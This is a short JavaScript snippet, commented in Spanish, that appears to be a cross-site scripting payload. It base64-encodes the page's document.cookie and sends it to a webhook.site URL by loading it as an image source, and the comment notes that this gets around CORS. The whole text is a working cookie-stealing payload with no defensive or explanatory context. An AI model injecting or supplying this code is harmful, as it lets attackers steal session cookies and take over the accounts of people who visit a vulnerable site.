// Codifica la cookie en base64 y la envía como imagen (bypass CORS)
var x = new Image();
x.src = "https://webhook.site/bece384c-6c1c-4e4f-88c3-b2904037892e?data=" + btoa(document.cookie);
